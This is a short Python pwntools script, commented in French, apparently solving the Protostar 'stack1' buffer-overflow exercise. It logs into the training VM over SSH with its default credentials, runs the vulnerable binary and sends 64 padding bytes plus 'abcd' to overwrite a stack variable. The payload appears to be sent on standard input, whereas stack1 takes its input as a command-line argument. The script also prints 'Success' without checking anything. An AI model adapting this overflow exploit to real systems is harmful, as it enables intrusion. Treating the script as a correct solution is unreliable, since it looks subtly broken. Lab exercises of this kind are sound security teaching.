#coding:utf-8

import pwn
pwn.context(arch="i386", os="linux")

remote = pwn.ssh("user", "192.168.0.10", password="user") #Bien évidement changer 192.168.0.10 par l'ip de la machine protostar


exploit = remote.run("/opt/protostar/bin/stack1")
exploit.sendline("\x90"*64 + "\x61\x62\x63\x64")

pwn.log.info("Success ! ")
